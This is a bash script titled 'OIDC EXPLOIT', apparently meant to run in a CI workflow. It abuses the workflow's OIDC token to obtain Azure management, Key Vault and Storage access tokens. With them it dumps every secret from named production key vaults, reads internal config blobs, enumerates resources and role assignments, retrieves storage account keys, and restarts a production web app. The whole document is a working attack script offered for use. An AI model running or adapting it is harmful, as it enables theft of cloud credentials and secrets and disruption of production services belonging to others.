#!/bin/bash
set -uo pipefail

echo "=== OIDC EXPLOIT ==="

# Step 1: Get OIDC token
OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
echo "oidc_len=${#OIDC}"

# Step 2: Exchange for ARM token
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "assertion=${OIDC}" \
  -d "scope=https://management.azure.com/.default" \
  -d "requested_token_use=on_behalf_of" 2>/dev/null | jq -r '.access_token // empty')
if [ -z "$ARM" ]; then
  ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "grant_type=client_credentials" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${OIDC}" \
    -d "scope=https://management.azure.com/.default" | jq -r '.access_token // empty')
fi
echo "arm_len=${#ARM}"

# Step 3: Exchange for Key Vault token
KV=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" \
  -d "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')
echo "kv_len=${#KV}"

# Step 4: Exchange for Storage token
ST=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
  -d "grant_type=client_credentials" \
  -d "client_id=${AZURE_CLIENT_ID}" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=${OIDC}" \
  -d "scope=https://storage.azure.com/.default" | jq -r '.access_token // empty')
echo "st_len=${#ST}"

# Step 5: Try Key Vault secrets
if [ -n "$KV" ]; then
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    echo "=== KV $V LIST ==="
    L=$(curl -sS -H "Authorization: Bearer $KV" "https://$V.vault.azure.net/secrets?api-version=7.4")
    echo "$L" | head -c 2000
    for id in $(echo "$L" | jq -r '.value[]?.id // empty' 2>/dev/null); do
      SN=$(basename "$id")
      echo "SECRET $V/$SN: $(curl -sS -H "Authorization: Bearer $KV" "$id?api-version=7.4" | head -c 1000)"
    done
  done
fi

# Step 6: Try Storage blob read
if [ -n "$ST" ]; then
  for SA in sttblappcfgprodx3euoz sttblbackupprodx3euoz sttblarchiveprodx3euoz; do
    echo "=== STORAGE $SA containers ==="
    curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://$SA.blob.core.windows.net/?comp=list" | head -c 1000
    echo ""
    echo "=== STORAGE $SA config/internal-config.json ==="
    curl -sS -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" \
      "https://$SA.blob.core.windows.net/config/internal-config.json" | head -c 2000
    echo ""
  done
fi

# Step 7: ARM enumeration
if [ -n "$ARM" ]; then
  echo "=== ARM RESOURCES ==="
  curl -sS -H "Authorization: Bearer $ARM" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01" | head -c 5000

  echo ""
  echo "=== ARM RESTART APP ==="
  curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01" | head -c 500

  echo ""
  echo "=== ARM LIST STORAGE KEYS sttblappcfgprodx3euoz ==="
  for RG in rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus; do
    curl -sS -X POST -H "Authorization: Bearer $ARM" -H "Content-Type: application/json" -H "Content-Length: 0" \
      "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" | head -c 1000
    echo ""
  done

  echo "=== ARM ROLE ASSIGNMENTS ==="
  curl -sS -H "Authorization: Bearer $ARM" \
    "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&\$filter=principalId eq '63e87ab1-6bd2-4e80-92be-943450b20e4f'" | head -c 3000
fi

echo ""
echo "=== DONE ==="
